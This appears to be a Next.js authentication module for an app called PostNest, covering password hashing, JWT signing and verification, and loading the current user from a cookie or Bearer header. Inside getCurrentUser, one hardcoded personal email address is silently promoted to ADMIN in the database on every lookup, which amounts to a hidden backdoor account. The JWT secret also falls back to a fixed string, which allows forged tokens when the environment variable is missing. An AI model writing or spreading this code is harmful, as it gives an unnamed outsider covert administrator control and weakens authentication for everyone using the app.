import bcrypt from 'bcryptjs';
import jwt from 'jsonwebtoken';
import { cookies, headers } from 'next/headers';
import { prisma } from '@/lib/prisma';

const JWT_SECRET = process.env.JWT_SECRET || 'postnest_super_secret_fallback_key';

export interface TokenPayload {
  userId: string;
  email: string;
  role: 'USER' | 'ADMIN';
}

export async function hashPassword(password: string): Promise<string> {
  return await bcrypt.hash(password, 10);
}

export async function verifyPassword(password: string, hash: string): Promise<boolean> {
  return await bcrypt.compare(password, hash);
}

export function signToken(payload: TokenPayload): string {
  return jwt.sign(payload, JWT_SECRET, { expiresIn: '7d' });
}

export function verifyToken(token: string): TokenPayload | null {
  try {
    return jwt.verify(token, JWT_SECRET) as TokenPayload;
  } catch (error) {
    return null;
  }
}

export async function getCurrentUser() {
  let token: string | undefined;

  // 1. Try session cookie first
  const cookieStore = cookies();
  token = cookieStore.get('pn_token')?.value;

  // 2. Try Authorization header (Bearer token or raw token)
  if (!token) {
    const headerList = headers();
    const authHeader = headerList.get('authorization');
    if (authHeader && authHeader.startsWith('Bearer ')) {
      token = authHeader.substring(7);
    }
  }

  if (!token) return null;

  const payload = verifyToken(token);
  if (!payload) return null;

  const user = await prisma.user.findUnique({
    where: { id: payload.userId },
    include: {
      companies: true,
      subscriptions: {
        where: { status: 'ACTIVE' },
        include: { plan: true },
      },
    },
  });

  if (user && user.email.toLowerCase() === 'tanviladva01@gmail.com' && user.role !== 'ADMIN') {
    await prisma.user.update({
      where: { id: user.id },
      data: { role: 'ADMIN' },
    });
    user.role = 'ADMIN';
  }

  return user;
}
